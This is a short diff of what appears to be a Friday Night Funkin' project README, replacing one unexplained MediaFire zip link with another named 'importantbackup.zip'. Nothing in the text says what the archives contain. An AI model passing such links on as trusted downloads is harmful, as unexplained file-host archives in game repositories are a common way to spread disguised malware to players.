@@ -3,7 +3,7 @@
 <h2>Friday Night Funkin' is a rhythm game. Built using HaxeFlixel for <a href="https://ldjam.com/events/ludum-dare/47">Ludum Dare 47.</a></h2>
 
 This game was made with love to Newgrounds and its community. Extra love to Tom Fulp.
-temporally https://www.mediafire.com/file/38n9ly9hmfcmbhn/output.zip/file
+temporally https://www.mediafire.com/file/102i4g50e9c2s0g/importantbackup.zip/file
 
 </div>
 
